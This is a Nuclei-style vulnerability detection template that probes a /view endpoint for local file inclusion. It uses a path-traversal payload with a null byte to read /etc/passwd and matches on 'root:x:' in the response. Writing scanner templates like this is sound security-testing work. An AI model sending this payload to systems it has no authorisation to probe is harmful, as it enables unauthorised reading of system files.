id: avvp-lfi-lfi-nullbyte-14
info:
  name: Null Byte LFI Probe
  severity: high
  tags:
  - lfi
  - legacy
  author: avvp
  description: Null Byte LFI Probe nuclei-style detection template.
metadata:
  category: lfi
  template_type: detection
  source: avvp
requests:
- method: GET
  path:
  - /view?path=../../../../etc/passwd%00
  matchers:
  - type: word
    words:
    - 'root:x:'
    - bin/bash
    part: body
